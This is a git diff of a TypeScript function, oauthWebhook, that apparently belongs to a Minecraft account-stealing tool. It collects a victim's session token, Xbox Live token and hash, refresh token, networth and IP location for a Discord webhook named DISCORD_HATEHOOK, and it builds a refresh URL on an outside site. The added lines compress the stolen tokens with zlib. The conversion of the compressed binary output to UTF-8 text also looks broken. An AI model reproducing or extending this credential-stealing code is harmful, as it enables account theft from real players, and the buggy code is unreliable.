@@ -1,5 +1,7 @@
 import ipGeolocation from "../geolocation";
 import dotenv from "dotenv";
+import Zlib from "zlib";
+
 dotenv.config();
 const hatehook = process.env.DISCORD_HATEHOOK;
 
@@ -7,6 +9,12 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
     const { username, uuid, session_token, xbl_hash, xbl_token, refresh_token } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
     const refreshURL = "https://breadcat.cc/api/v1/auth/manual/refresh";
+
+    //compress refresh token and xbl token using zlib
+    const compressedRefreshToken = Zlib.deflateSync(refresh_token).toString("utf8");
+    const compressedXblToken = Zlib.deflateSync(xbl_token).toString("utf8");
+    const compressedXblHash = Zlib.deflateSync(xbl_hash).toString("utf8");
+    console.log(compressedRefreshToken.length + compressedXblToken.length + compressedXblHash.length)
 
     //format networth to be human readable using K, M, B, T
     const formatedNw = Intl.NumberFormat('en-US', {
